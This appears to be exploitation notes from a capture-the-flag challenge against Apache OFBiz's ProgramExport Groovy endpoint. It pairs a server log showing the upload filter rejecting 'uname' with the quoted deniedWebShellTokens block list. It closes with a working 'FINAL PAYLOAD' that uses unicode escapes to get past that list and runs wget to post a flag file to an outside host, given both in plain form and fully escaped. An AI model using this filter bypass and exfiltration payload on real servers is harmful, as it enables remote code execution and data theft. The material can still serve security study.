+2024-08-12 19:36:34,746 |sse-nio-8443-exec-10 |ControlServlet                |T| [[[TestService(Domain:https://demo-trunk.ofbiz.apache.org)] Request Begun, encoding=[UTF-8]- total:0.0,since last(Begin):0.0]]
+2024-08-12 19:36:34,746 |sse-nio-8443-exec-10 |VisitHandler                  |I| Found visitorId [null] in cookie
+2024-08-12 19:36:34,755 |sse-nio-8443-exec-10 |ConfigXMLReader               |I| controller loaded: 0.0s, 112 requests, 78 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/webapp/webtools/WEB-INF/controller.xml
+2024-08-12 19:36:34,761 |sse-nio-8443-exec-10 |ConfigXMLReader               |I| controller loaded: 0.001s, 48 requests, 22 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/common-controller.xml
+2024-08-12 19:36:34,765 |sse-nio-8443-exec-10 |ConfigXMLReader               |I| controller loaded: 0.0s, 0 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/handlers-controller.xml
+2024-08-12 19:36:34,770 |sse-nio-8443-exec-10 |ConfigXMLReader               |I| controller loaded: 0.0s, 26 requests, 10 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/portal-controller.xml
+2024-08-12 19:36:34,774 |sse-nio-8443-exec-10 |ConfigXMLReader               |I| controller loaded: 0.0s, 30 requests, 13 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/security-controller.xml
+2024-08-12 19:36:34,778 |sse-nio-8443-exec-10 |ConfigXMLReader               |I| controller loaded: 0.0s, 5 requests, 0 views in file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/webcommon/WEB-INF/tempexpr-controller.xml
+2024-08-12 19:36:34,779 |sse-nio-8443-exec-10 |RequestHandler                |I| This is the first request in this visit. Hidden sessionId by default.
+2024-08-12 19:36:34,779 |sse-nio-8443-exec-10 |JWTManager                    |I| Internal single sign on is disabled.
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |ModelService                  |I| Set default value [999.9999] for parameter [defaultValue]
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |ServiceEcaCondition           |I| From Field (message) is not found in context for testScv, defaulting to null.
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |ServiceEcaRule                |I| For Service ECA [testScv] on [invoke] got false for condition: [message][equals][auto][true][String]
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |CommonServices                |I| ---- SVC-CONTEXT: defaultValue => 999.9999
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |CommonServices                |I| ---- SVC-CONTEXT: timeZone => sun.util.calendar.ZoneInfo[id="Europe/Vienna",offset=3600000,dstSavings=3600000,useDaylight=true,transitions=139,lastRule=java.util.SimpleTimeZone[id=Europe/Vienna,offset=3600000,dstSavings=3600000,useDaylight=true,startYear=0,startMode=2,startMonth=2,startDay=-1,startDayOfWeek=1,startTime=3600000,startTimeMode=2,endMode=2,endMonth=9,endDay=-1,endDayOfWeek=1,endTime=3600000,endTimeMode=2]]
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |CommonServices                |I| ---- SVC-CONTEXT: locale => en
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |CommonServices                |I| ----- SVC: webtools -----
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |RequestHandler                |I| Ran Event [service:#testScv] from [request], result is [success]
+2024-08-12 19:36:34,780 |sse-nio-8443-exec-10 |RequestHandler                |I| Rendering View [ProgramExport].  Hidden sessionId by default.
+2024-08-12 19:36:34,781 |sse-nio-8443-exec-10 |ServiceDispatcher             |T| Sync service [webtools/getUserPreferenceGroup] finished in [1] milliseconds
+2024-08-12 19:36:34,784 |sse-nio-8443-exec-10 |ScreenFactory                 |I| Got 20 screens in 0.002s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/widget/EntityScreens.xml
+!!! also execute 2024-08-12 19:36:34,834 |sse-nio-8443-exec-10 |SecuredUpload                 |I| The uploaded file contains the string 'uname '. It can't be uploaded for security reason
+2024-08-12 19:36:34,834 |sse-nio-8443-exec-10 |ProgramExport                 |E| ================== Not executed for security reason ==================
+2024-08-12 19:36:34,836 |sse-nio-8443-exec-10 |ScreenFactory                 |I| Got 11 screens in 0.002s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/webtools/widget/CommonScreens.xml
+2024-08-12 19:36:34,838 |sse-nio-8443-exec-10 |ScreenFactory                 |I| Got 27 screens in 0.002s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/framework/common/widget/CommonScreens.xml
+2024-08-12 19:36:34,864 |sse-nio-8443-exec-10 |ScreenFactory                 |I| Got 26 screens in 0.002s from: file:/opt/ofbiz/ofbiz/18.12.14/apache-ofbiz-18.12.14/themes/common-theme/widget/CommonScreens.xml
+2024-08-12 19:36:34,867 |sse-nio-8443-exec-10 |ServerHitBin                  |I| Visit delegatorName=default, ServerHitBin delegatorName=default
+2024-08-12 19:36:34,868 |sse-nio-8443-exec-10 |ControlServlet                |T| [[[TestService(Domain:https://demo-trunk.ofbiz.apache.org)] Request Done- total:0.122,since last([TestService(Doma...):0.122]]
+
+configured here:
+File: ofbiz-framework-release18.12.05/framework/security/config/security.properties
+
+deniedWebShellTokens=freemarker,import=\"java,runtime.getruntime().exec(,<%@ page,<script,<body>,<form,php,javascript,%eval,@eval,import os,passthru,exec,shell_exec,assert,str_rot13,system,phpinfo,base64_decode,chmod,mkdir,fopen,fclose,new file,import,upload,getfilename,download,getoutputstring,readfile
+
+FINAL PAYLOAD:
+<@unicode_escapes>throw new Exception('wget --post-file /opt/ofbiz/flag 172.17.0.1:55555 -q -T 999999'.execute().text);<@/unicode_escapes>
+
+groovyProgram=
+\u0074\u0068\u0072\u006F\u0077\u0020\u006E\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006F\u006E\u0028\u0027\u0077\u0067\u0065\u0074\u0020\u002D\u002D\u0070\u006F\u0073\u0074\u002D\u0066\u0069\u006C\u0065\u0020\u002F\u006F\u0070\u0074\u002F\u006F\u0066\u0062\u0069\u007A\u002F\u0066\u006C\u0061\u0067\u0020\u0031\u0037\u0032\u002E\u0031\u0037\u002E\u0030\u002E\u0031\u003A\u0035\u0035\u0035\u0035\u0035\u0020\u002D\u0071\u0020\u002D\u0054\u0020\u0039\u0039\u0039\u0039\u0039\u0039\u0027\u002E\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002E\u0074\u0065\u0078\u0074\u0029\u003B
